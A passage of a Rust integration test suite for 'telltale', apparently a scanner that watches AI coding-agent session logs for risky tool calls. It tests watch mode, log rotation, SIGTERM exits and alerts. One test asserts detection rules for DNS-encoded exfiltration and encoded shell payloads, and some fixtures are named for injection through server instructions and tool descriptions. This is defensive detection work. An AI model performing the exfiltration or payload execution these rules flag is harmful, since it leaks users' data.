        "fixed_session_ids":session_ids,
        "queue":"NOT CONFIGURED","terminal_history":"NOT CONFIGURED",
        "iterations":"unbounded watch, explicit TERM after final settled sample",
    }), serde_json::json!({
        "postwarm_rss_samples_kib":postwarm_rss, "window_cycles":window_cycles,"rss_windows":windows,
        "linear_rss_slope_kib_per_hour":slope,"rss_characterization_flag":"REQUIRES OWNER INTERPRETATION; no universal RSS bound",
        "postwarm_nondecreasing_with_net_growth":monotonic,
        "sampling":"current live VmRSS after health plus >=250ms quiet; warmup excluded; HWM reported separately",
        "interpretation":"trajectory and slope diagnostic, not a definitive leak test or RSS cap; oscillation does not establish absence of a leak",
    }));
    assert!(
        cadence_met,
        "write-to-health exceeded stated cadence; see workload report"
    );
    if default_cycles == 7201 && cycles == default_cycles {
        assert!(
            write_times.last().unwrap() - write_times.first().unwrap() >= 7200.0,
            "two-hour first-to-last gate; see report"
        );
    }
}

#[cfg(target_os = "linux")]
#[test]
#[ignore = "Phase 4 synthetic watch soak; run explicitly on Linux"]
fn watch_synthetic_multi_cycle_soak() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    let sessions = root.join("codex/sessions");
    fs::create_dir_all(&sessions).expect("codex sessions dir");
    let malformed_path = sessions.join("malformed-source.jsonl");
    fs::copy(
        Path::new("tests/fixtures/rule_samples/malformed-source.jsonl"),
        &malformed_path,
    )
    .expect("copy malformed fixture");
    let valid_later_path = sessions.join("uc001-positive.jsonl");
    let valid_later = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
    );
    let valid_second_path = sessions.join("uc001-positive-server-instructions.jsonl");
    let valid_second = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-server-instructions.jsonl"
    );
    let valid_third_path = sessions.join("uc001-positive-tool-description.jsonl");
    let valid_third = include_bytes!(
        "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive-tool-description.jsonl"
    );
    for path in [&valid_later_path, &valid_second_path, &valid_third_path] {
        fs::write(path, b"").expect("pre-create valid source");
    }

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let mut child = WatchChildGuard::new(
        Command::new(env!("CARGO_BIN_EXE_telltale"))
            .env_clear()
            .env("HOME", temp.path())
            .args([
                "watch",
                "--allow-fixtures",
                "--no-local-config",
                "--client",
                "codex",
                "--iterations",
                "6",
                "--debounce-ms",
                "100",
                "--min-scan-interval-ms",
                "0",
                "--install-inventory-disabled",
                "--log-rotate-max-size",
                "1",
                "--log-rotate-keep",
                "2",
                "--root",
            ])
            .arg(&root)
            .arg("--log-path")
            .arg(&log_path)
            .arg("--state-path")
            .arg(&state_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn telltale watch soak"),
    );

    let (summary_tx, summary_rx) = mpsc::channel();
    let stdout = child.child_mut().stdout.take().expect("watch stdout");
    let stdout_reader = thread::spawn(move || {
        for line in BufReader::new(stdout).lines().map_while(Result::ok) {
            if summary_tx.send(line).is_err() {
                break;
            }
        }
    });
    let pid = child.id();
    let measurements = std::cell::RefCell::new(workload::Measurements::new("watch-six-cycles"));
    let proc_fd_path = format!("/proc/{pid}/fd");
    let proc_fdinfo_path = format!("/proc/{pid}/fdinfo");
    if !Path::new("/proc").is_dir()
        || fs::read_dir("/proc/self/fd").is_err()
        || !Path::new(&proc_fd_path).is_dir()
        || !Path::new(&proc_fdinfo_path).is_dir()
    {
        panic!("Linux procfs prerequisite unavailable for watch readiness: /proc/<pid>/fd");
    }
    let readiness_deadline = Instant::now() + Duration::from_secs(20);
    loop {
        let mut has_inotify_watch = false;
        for entry in fs::read_dir(&proc_fd_path)
            .expect("Linux procfs prerequisite unavailable while reading child fds")
        {
            let entry = entry.expect("Linux procfs prerequisite unavailable while reading fd");
            match fs::read_link(entry.path()) {
                Ok(target) if target.to_string_lossy().contains("inotify") => {
                    let Some(fd) = entry.file_name().to_string_lossy().parse::<u32>().ok() else {
                        continue;
                    };
                    let fdinfo = match fs::read_to_string(format!("{proc_fdinfo_path}/{fd}")) {
                        Ok(fdinfo) => fdinfo,
                        Err(error) if error.kind() == std::io::ErrorKind::NotFound => continue,
                        Err(error) => panic!(
                            "Linux procfs prerequisite unavailable while reading inotify fdinfo: {error}"
                        ),
                    };
                    if fdinfo
                        .lines()
                        .any(|line| line.trim_start().starts_with("inotify wd:"))
                    {
                        has_inotify_watch = true;
                        break;
                    }
                }
                Ok(_) => {}
                Err(error) if error.kind() == std::io::ErrorKind::NotFound => {}
                Err(error) => {
                    panic!("Linux procfs prerequisite unavailable while reading fd target: {error}")
                }
            }
        }
        if has_inotify_watch {
            break;
        }
        if Instant::now() >= readiness_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!(
                "Linux inotify readiness prerequisite unavailable: no inotify fdinfo contained an inotify wd: line"
            );
        }
        thread::sleep(Duration::from_millis(20));
    }
    let fd_count = || {
        let mut count = 0;
        for entry in fs::read_dir(&proc_fd_path).expect("read child file descriptors") {
            entry.expect("read child file descriptor");
            count += 1;
        }
        count
    };

    let wait_for_next_scan = |child: &mut std::process::Child,
                              path: &Path,
                              contents: &[u8],
                              allow_exit_during_quiet: bool| {
        match summary_rx.try_recv() {
            Ok(_) => panic!("unexpected extra watch summary before single-cycle write"),
            Err(mpsc::TryRecvError::Disconnected) => {
                panic!("watch summary reader disconnected before single-cycle write")
            }
            Err(mpsc::TryRecvError::Empty) => {}
        }
        fs::write(path, contents).expect("trigger exactly one watch event");
        let started = Instant::now();
        let deadline = Instant::now() + Duration::from_secs(20);
        let summary = loop {
            measurements.borrow_mut().observe(pid);
            match summary_rx.recv_timeout(Duration::from_millis(20)) {
                Ok(line) => break serde_json::from_str::<Value>(&line).expect("summary json"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    panic!("watch summary reader disconnected before scan completed")
                }
            }
            if let Some(status) = child.try_wait().expect("poll telltale watch") {
                panic!("telltale watch exited before scan completed: {status:?}")
            }
            if Instant::now() >= deadline {
                let _ = child.kill();
                let _ = child.wait();
                panic!("telltale watch did not complete the single triggered scan within timeout")
            }
        };
        measurements.borrow_mut().sample(
            "write-to-health-summary",
            started.elapsed(),
            &state_path,
            &log_path,
        );
        let quiet_deadline = Instant::now() + Duration::from_millis(150);
        while Instant::now() < quiet_deadline {
            let remaining = quiet_deadline.saturating_duration_since(Instant::now());
            match summary_rx.recv_timeout(remaining.min(Duration::from_millis(20))) {
                Ok(_) => panic!("extra watch summary followed a single-cycle write"),
                Err(mpsc::RecvTimeoutError::Timeout) => {}
                Err(mpsc::RecvTimeoutError::Disconnected) => {
                    if !allow_exit_during_quiet {
                        panic!("watch summary reader disconnected during quiet period")
                    }
                    thread::sleep(remaining);
                    break;
                }
            }
            if child
                .try_wait()
                .expect("poll telltale watch quiet period")
                .is_some()
                && !allow_exit_during_quiet
            {
                panic!("telltale watch exited unexpectedly during quiet period")
            }
        }
        summary
    };
    let telemetry_paths = || {
        fs::read_dir(temp.path())
            .expect("read telemetry directory")
            .map(|entry| entry.expect("telemetry entry").path())
            .filter(|path| {
                path.file_name()
                    .and_then(|name| name.to_str())
                    .is_some_and(|name| {
                        name == "telltale-events.jsonl"
                            || (name.starts_with("telltale-events-") && name.ends_with(".jsonl"))
                    })
            })
            .collect::<Vec<_>>()
    };
    let rotated_paths = || {
        telemetry_paths()
            .into_iter()
            .filter(|path| path != &log_path)
            .collect::<Vec<_>>()
    };
    let read_events = || {
        telemetry_paths()
            .iter()
            .flat_map(|path| {
                fs::read_to_string(path)
                    .expect("read telemetry file")
                    .lines()
                    .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
                    .collect::<Vec<_>>()
            })
            .collect::<Vec<_>>()
    };
    let assert_detection = |session_id: &str| {
        assert!(
            read_events().iter().any(|event| {
                event["event_type"] == "detection" && event["session_id"] == session_id
            }),
            "expected detection for {session_id} after its scan"
        );
    };
    let malformed = fs::read(&malformed_path).expect("read malformed fixture");
    let mut summaries = Vec::new();
    summaries.push(wait_for_next_scan(
        child.child_mut(),
        &malformed_path,
        &malformed,
        false,
    ));
    assert_eq!(summaries[0]["event_type"], "health");
    assert_eq!(summaries[0]["detection_count"], 1);
    assert_eq!(summaries[0]["emitted_count"], 1);
    assert_eq!(summaries[0]["delivery"]["status"], "delivered");
    let first_events = fs::read_to_string(&log_path).expect("first telemetry");
    assert!(first_events.lines().any(|line| {
        serde_json::from_str::<Value>(line).expect("first event json")["event_type"]
            == "scanner_error"
    }));
    let fd_baseline = fd_count();
    let mut fd_counts: Vec<usize> = vec![fd_baseline];

    let read_state = || {
        let bytes = fs::read(&state_path).expect("scanner state");
        let state = serde_json::from_slice::<Value>(&bytes).expect("scanner state json");
        (state, bytes.len())
    };
    let (first_state, first_state_bytes) = read_state();
    let first_state_mtime = fs::metadata(&state_path)
        .expect("first state metadata")
        .modified()
        .expect("first state mtime");

    let run_noop = |child: &mut std::process::Child,
                    path: &Path,
                    contents: &[u8],
                    prior_state: &Value,
                    prior_mtime: std::time::SystemTime| {
        thread::sleep(Duration::from_millis(2_100));
        let summary = wait_for_next_scan(child, path, contents, false);
        let fd_sample = fd_count();
        let (state, bytes) = read_state();
        let mtime = fs::metadata(&state_path)
            .expect("no-op state metadata")
            .modified()
            .expect("no-op state mtime");
        assert_eq!(&state, prior_state);
        assert_eq!(mtime, prior_mtime);
        assert_eq!(summary["event_type"], "health");
        assert_eq!(summary["detection_count"], 1);
        assert_eq!(summary["emitted_count"], 0);
        assert_eq!(summary["delivery"]["status"], "delivered");
        (summary, state, bytes, mtime, fd_sample)
    };

    let (second_summary, second_state, second_state_bytes, _, second_fd) = run_noop(
        child.child_mut(),
        &malformed_path,
        &malformed,
        &first_state,
        first_state_mtime,
    );
    summaries.push(second_summary);
    fd_counts.push(second_fd);

    let valid_summary =
        wait_for_next_scan(child.child_mut(), &valid_later_path, valid_later, false);
    assert_eq!(valid_summary["emitted_count"], 1);
    summaries.push(valid_summary);
    assert_detection("uc001-positive");
    fd_counts.push(fd_count());
    let (state_after_valid, valid_state_bytes) = read_state();
    let valid_state_mtime = fs::metadata(&state_path)
        .expect("valid state metadata")
        .modified()
        .expect("valid state mtime");
    assert_ne!(state_after_valid, second_state);
    let first_rotated_paths = rotated_paths();
    assert_eq!(first_rotated_paths.len(), 1);
    let oldest_rotated_path = first_rotated_paths
        .into_iter()
        .next()
        .expect("first rotated path");

    let (no_op_summary, _state_after_noop, no_op_state_bytes, _, no_op_fd) = run_noop(
        child.child_mut(),
        &valid_later_path,
        valid_later,
        &state_after_valid,
        valid_state_mtime,
    );
    summaries.push(no_op_summary);
    fd_counts.push(no_op_fd);

    let followup_sources: [(&Path, &[u8], &str, bool); 2] = [
        (
            &valid_second_path,
            valid_second,
            "uc001-positive-server-instructions",
            false,
        ),
        (
            &valid_third_path,
            valid_third,
            "uc001-positive-tool-description",
            true,
        ),
    ];
    let mut scanner_errors_before_pruning = 0;
    for (index, (path, contents, session_id, terminal)) in followup_sources.into_iter().enumerate()
    {
        let summary = wait_for_next_scan(child.child_mut(), path, contents, terminal);
        assert_eq!(summary["emitted_count"], 1);
        summaries.push(summary);
        assert_detection(session_id);
        if index == 0 {
            fd_counts.push(fd_count());
            scanner_errors_before_pruning = read_events()
                .iter()
                .filter(|event| event["event_type"] == "scanner_error")
                .count();
            assert_eq!(scanner_errors_before_pruning, 1);
        }
    }

    let exit_deadline = Instant::now() + Duration::from_secs(20);
    let final_status = loop {
        if let Some(status) = child
            .child_mut()
            .try_wait()
            .expect("poll final telltale watch")
        {
            break status;
        }
        if Instant::now() >= exit_deadline {
            let _ = child.child_mut().kill();
            let _ = child.child_mut().wait();
            panic!("telltale watch did not exit after finite soak iterations")
        }
        thread::sleep(Duration::from_millis(20));
    };
    assert!(
        final_status.success(),
        "watch soak failed: {final_status:?}"
    );
    let exited_child = child.disarm();
    let output = exited_child
        .wait_with_output()
        .expect("collect telltale watch output");
    stdout_reader.join().expect("join watch summary reader");
    assert!(!Path::new(&proc_fd_path).exists());

    assert_eq!(summaries.len(), 6, "every triggered scan must complete");
    assert!(
        summaries
            .iter()
            .all(|summary| summary["event_type"] == "health")
    );
    assert!(summaries[2]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[4]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(summaries[5]["detection_count"].as_u64().unwrap_or(0) > 0);
    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let rotated_count = rotated_paths().len();
    assert_eq!(rotated_count, 2, "rotation should retain exactly two files");
    assert!(!oldest_rotated_path.exists());

    let events = read_events();
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection" && event["session_id"] == "uc001-positive"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-server-instructions"
    }));
    assert!(events.iter().any(|event| {
        event["event_type"] == "detection"
            && event["session_id"] == "uc001-positive-tool-description"
    }));

    assert!(
        fd_counts
            .iter()
            .all(|count| *count <= fd_baseline.saturating_add(2)),
        "watch fd count exceeded the justified two-descriptor delta from baseline {fd_baseline}: {fd_counts:?}"
    );
    println!(
        "watch soak measurements: cycles={} state_bytes=[{first_state_bytes},{second_state_bytes},{valid_state_bytes},{no_op_state_bytes}] fd_baseline={fd_baseline} fd_counts={fd_counts:?} rotated_files={rotated_count} scanner_errors_before_pruning={scanner_errors_before_pruning}",
        summaries.len(),
    );
    let retained_paths = telemetry_paths();
    measurements.borrow().finish(&[&malformed, valid_later, valid_second, valid_third], "ordered-source-fixture-bytes; empty files and six-cycle write order defined by case generator",
        serde_json::json!({"command": "watch --allow-fixtures --no-local-config --client codex --iterations 6 --debounce-ms 100 --min-scan-interval-ms 0 --install-inventory-disabled --log-rotate-max-size 1 --log-rotate-keep 2 --root <isolated> --log-path <isolated> --state-path <isolated>", "rules": "compiled defaults", "cadence_ms": null, "cold_os_cache": false}),
        serde_json::json!({"state_bytes": [first_state_bytes, second_state_bytes, valid_state_bytes, no_op_state_bytes], "fd_counts": fd_counts, "rotated_files": rotated_count, "retained_log_bytes": retained_paths.iter().map(|p| fs::metadata(p).unwrap().len()).sum::<u64>(), "retained_event_count": events.len(), "outbox": null, "queue": null}));
}

#[cfg(unix)]
#[test]
fn watch_exits_cleanly_on_sigterm() {
    let _watch_guard = watch_process_guard();
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("stores");
    copy_dir_recursive(
        Path::new("tests/fixtures/session_stores/codex"),
        &root.join("codex"),
    );
    let session = root.join("codex/sessions/2026/04/session-a.jsonl");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let mut child = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "watch",
            "--dry-run",
            "--no-local-config",
            "--install-inventory-disabled",
            "--root",
        ])
        .arg(&root)
        .arg("--log-path")
        .arg(&log_path)
        .arg("--state-path")
        .arg(&state_path)
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .expect("spawn telltale watch");

    let stdout = child.stdout.take().expect("watch stdout");
    let (line_tx, line_rx) = mpsc::channel();
    thread::spawn(move || {
        for line in BufReader::new(stdout).lines() {
            if line_tx.send(line).is_err() {
                break;
            }
        }
    });
    let deadline = Instant::now() + Duration::from_secs(20);
    let mut next_trigger = Instant::now();
    let mut attempts = 0;
    let mut last_line = String::new();
    // Retries schedule work; only the completed scan summary establishes readiness.
    loop {
        if let Some(status) = child.try_wait().expect("poll watch scan readiness") {
            fail_watch(
                &mut child,
                &format!(
                    "watch exited before a completed scan: {status:?}; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            );
        }
        let now = Instant::now();
        if now >= deadline {
            fail_watch(
                &mut child,
                &format!(
                    "watch did not complete a triggered scan within 20s; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            );
        }
        if now >= next_trigger {
            attempts += 1;
            append_sigterm_watch_trigger(&session, attempts).unwrap_or_else(|error| {
                fail_watch(
                    &mut child,
                    &format!("append synthetic watch trigger failed: {error}"),
                )
            });
            next_trigger = Instant::now() + Duration::from_millis(250);
        }
        match line_rx.recv_timeout(
            deadline
                .saturating_duration_since(Instant::now())
                .min(Duration::from_millis(50)),
        ) {
            Ok(Ok(line)) => {
                if is_sigterm_watch_summary(&line) && Instant::now() < deadline {
                    break;
                }
                last_line = line;
            }
            Ok(Err(error)) => {
                fail_watch(&mut child, &format!("watch stdout reader failed: {error}"))
            }
            Err(mpsc::RecvTimeoutError::Disconnected) => fail_watch(
                &mut child,
                &format!(
                    "watch stdout disconnected before completed scan; attempts={attempts}; last stdout line: {last_line:?}"
                ),
            ),
            Err(mpsc::RecvTimeoutError::Timeout) => {}
        }
    }
    let kill = Command::new("kill")
        .args(["-TERM", &child.id().to_string()])
        .status()
        .unwrap_or_else(|error| fail_watch(&mut child, &format!("send SIGTERM failed: {error}")));
    if !kill.success() {
        fail_watch(&mut child, &format!("send SIGTERM failed: {kill:?}"));
    }

    let deadline = Instant::now() + Duration::from_secs(15);
    loop {
        if let Some(status) = child.try_wait().expect("poll telltale watch") {
            if !status.success() {
                fail_watch(
                    &mut child,
                    &format!("watch should exit cleanly on SIGTERM, got {status:?}"),
                );
            }
            break;
        }
        if Instant::now() > deadline {
            fail_watch(&mut child, "telltale watch did not exit after SIGTERM");
        }
        thread::sleep(Duration::from_millis(100));
    }
}

#[test]
fn scan_once_emits_native_high_risk_detection_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let listener = TcpListener::bind("127.0.0.1:0").expect("bind no-network probe");
    listener
        .set_nonblocking(true)
        .expect("nonblocking no-network probe");
    let api_base = format!("http://{}", listener.local_addr().expect("probe address"));
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    fs::write(
        temp.path().join(".env"),
        format!(
            "LITELLM_API_BASE={api_base}\nLITELLM_API_KEY=test-key\nMODEL=triage-model\nLLAMA_GUARD_MODEL=guard-model\n"
        ),
    )
    .expect("mock env");

    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(matches!(
        listener.accept(),
        Err(error) if error.kind() == std::io::ErrorKind::WouldBlock
    ));

    let summary: Value = serde_json::from_slice(&output.stdout).expect("summary json");
    assert_eq!(summary["detection_count"], 1);

    let lines = fs::read_to_string(log_path).expect("log file");
    let events = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect::<Vec<_>>();
    let detection = events
        .iter()
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(
        !detection["timeline_anchors"]
            .as_array()
            .expect("timeline anchors")
            .is_empty()
    );
    assert!(detection["response"].is_object());
}

#[test]
fn canonical_codex_dns_exfil_projects_fixed_event3_evidence() {
    const COMMAND_HASH: &str = "e359841309a2ad6b6b698dbcd7f054a2d0470841a788ffb060b1763586b3ed7f";
    const OBSERVATION_HASH: &str =
        "b167d3da5f674468318c67cff289259acc0904c3a711e655bd1509d1499803e8";
    let root = tempdir().unwrap();
    let sessions = root.path().join("codex/sessions/2026/04");
    fs::create_dir_all(&sessions).unwrap();
    fs::copy(
        Path::new(env!("CARGO_MANIFEST_DIR")).join(
            "tests/fixtures/session_stores/codex/sessions/2026/04/uc003-positive-dns-exfil.jsonl",
        ),
        sessions.join("uc003-positive-dns-exfil.jsonl"),
    )
    .unwrap();
    let scanned = telltale_core::Pipeline::builder()
        .build()
        .unwrap()
        .scan_root(root.path())
        .unwrap();
    let detections = scanned
        .iter()
        .map(|(_, event)| event)
        .filter(|event| event.event_type == "detection")
        .collect::<Vec<_>>();
    assert_eq!(detections.len(), 1);
    let event = detections[0];
    assert_eq!(event.session_id, "uc003-positive-dns-exfil");
    assert_eq!(
        event.rule_ids,
        [
            "chain.shell_encoded_payload",
            "execution.encoded_payload",
            "execution.shell",
            "exfil.dns_encoding",
        ]
    );
    assert_eq!(event.risk_score, 130);

    let mut contributions = event
        .risk_contributions
        .iter()
        .map(|item| (item.id(), item.points()))
        .collect::<Vec<_>>();
    contributions.sort_unstable();
    assert_eq!(
        contributions,
        [
            ("chain.shell_encoded_payload", 10),
            ("execution.encoded_payload", 50),
            ("execution.shell", 15),
            ("exfil.dns_encoding", 55),
        ]
    );

    let mut evidence = event
        .evidence
        .iter()
        .map(|item| {
            (
                item.field.as_str(),
                item.hash.as_deref(),
                item.rule_id.as_deref(),
            )
        })
        .collect::<Vec<_>>();
    evidence.sort_unstable();
    let mut expected_evidence = [
        "execution.shell",
        "execution.encoded_payload",
        "exfil.dns_encoding",
    ]
    .into_iter()
    .flat_map(|rule| {
        [
            ("command", Some(COMMAND_HASH), Some(rule)),
            (
                "canonical_observation_id",
                Some(OBSERVATION_HASH),
                Some(rule),
            ),
        ]
    })
    .collect::<Vec<_>>();
    expected_evidence.sort_unstable();
    assert_eq!(evidence, expected_evidence);

    assert_eq!(event.timeline_anchors.len(), 1);
    assert_eq!(event.timeline_anchors[0].entry_index, 0);
    assert_eq!(event.timeline_anchors[0].rule_ids, event.rule_ids);
    assert_eq!(event.timeline_anchors[0].evidence_fields, ["command"]);
}

#[test]
fn scan_once_uses_canonical_threshold_without_network() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions/2026/04");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("uc001-positive.jsonl"),
        include_str!(
            "../../tests/fixtures/session_stores/codex/sessions/2026/04/uc001-positive.jsonl"
        ),
    )
    .expect("uc001 fixture");
    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let rule_path = std::env::current_dir()
        .expect("repo cwd")
        .join("config/rules/tool-call-regex.yaml");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--rules"])
        .arg(&rule_path)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_RISK_THRESHOLD_HIGH", "1")
        .env_remove("LITELLM_API_BASE")
        .env_remove("LITELLM_API_KEY")
        .env_remove("MODEL")
        .env_remove("LLAMA_GUARD_MODEL")
        .current_dir(temp.path())
        .output()
        .expect("run telltale scan");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    let lines = fs::read_to_string(log_path).expect("log file");
    let detection = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .find(|event| event["event_type"] == "detection")
        .expect("detection event");
    assert!(detection.get("triage").is_none());
    assert!(detection["response"].is_object());

    let validator = event_schema_validator();
    assert!(
        validator.is_valid(&detection),
        "native detection event failed schema validation"
    );
}

#[test]
fn operational_alert_emitted_when_scanner_errors_exceed_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    // Use a malformed source that triggers a scanner_error event.
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "0")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let alert = events
        .iter()
        .find(|event| event["event_type"] == "operational_alert")
        .expect("operational_alert event should be present");
    assert_eq!(alert["severity"], "warning");
    assert_eq!(alert["client"], "scanner");
    assert_eq!(alert["session_id"], "scanner");
    assert!(
        alert["categories"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("operational".to_string()))
    );
    assert!(
        alert["tags"]
            .as_array()
            .unwrap()
            .contains(&Value::String("scanner_health".to_string()))
    );
    assert_eq!(alert["risk_score"], 0);
    assert_eq!(alert["telltale_version"], env!("CARGO_PKG_VERSION"));

    // Verify the alert_type evidence field.
    let alert_type_evidence = alert["evidence"]
        .as_array()
        .unwrap()
        .iter()
        .find(|e| e["field"] == "alert_type")
        .expect("alert_type evidence");
    assert_eq!(
        alert_type_evidence["redacted_value"],
        "scanner_error_threshold_exceeded"
    );

    // Validate against the event schema.
    let validator = event_schema_validator();
    assert!(
        validator.is_valid(alert),
        "operational_alert event failed schema validation"
    );
}

#[test]
fn operational_alert_not_emitted_when_scanner_errors_below_threshold() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");
    let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
        .args([
            "scan",
            "--once",
            "--allow-fixtures",
            "--no-local-config",
            "--root",
        ])
        .arg(&root)
        .args(["--log-path"])
        .arg(&log_path)
        .args(["--state-path"])
        .arg(&state_path)
        .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
        .output()
        .expect("run telltale");

    assert!(
        output.status.success(),
        "stderr: {}",
        String::from_utf8_lossy(&output.stderr)
    );

    let lines = fs::read_to_string(log_path).expect("log file");
    let events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        !events
            .iter()
            .any(|event| event["event_type"] == "operational_alert"),
        "operational_alert should not be emitted when errors are below threshold"
    );
}

#[test]
fn scanner_error_events_dedup_on_subsequent_scans() {
    let temp = tempdir().expect("tempdir");
    let root = temp.path().join("session_stores");
    let codex_sessions = root.join("codex/sessions");
    fs::create_dir_all(&codex_sessions).expect("codex sessions dir");
    fs::write(
        codex_sessions.join("malformed-source.jsonl"),
        include_str!("../../tests/fixtures/rule_samples/malformed-source.jsonl"),
    )
    .expect("malformed fixture");

    let log_path = temp.path().join("telltale-events.jsonl");
    let state_path = temp.path().join("telltale-state.json");

    let run_scan = || {
        let output = Command::new(env!("CARGO_BIN_EXE_telltale"))
            .args([
                "scan",
                "--once",
                "--allow-fixtures",
                "--no-local-config",
                "--root",
            ])
            .arg(&root)
            .args(["--log-path"])
            .arg(&log_path)
            .args(["--state-path"])
            .arg(&state_path)
            .env("TELLTALE_OP_ALERT_MAX_SCANNER_ERRORS", "5")
            .output()
            .expect("run telltale");

        assert!(
            output.status.success(),
            "stderr: {}",
            String::from_utf8_lossy(&output.stderr)
        );
    };

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after first scan");
    let first_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "scanner_error"),
        "first scan should emit a scanner_error event"
    );
    assert!(
        first_events
            .iter()
            .any(|event| event["event_type"] == "health"),
        "first scan should emit health for the new scanner error"
    );

    run_scan();

    let lines = fs::read_to_string(&log_path).expect("log file after second scan");
    let all_events: Vec<Value> = lines
        .lines()
        .map(|line| serde_json::from_str::<Value>(line).expect("event json"))
        .collect();

    let scanner_errors: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "scanner_error")
        .collect();
    assert_eq!(
        scanner_errors.len(),
        1,
        "second scan should suppress an unchanged scanner_error"
    );

    let health_events: Vec<_> = all_events
        .iter()
        .filter(|event| event["event_type"] == "health")
        .collect();
    assert_eq!(
        health_events.len(),
        1,
        "second scan should not emit health for an unchanged scanner_error"
    );
}
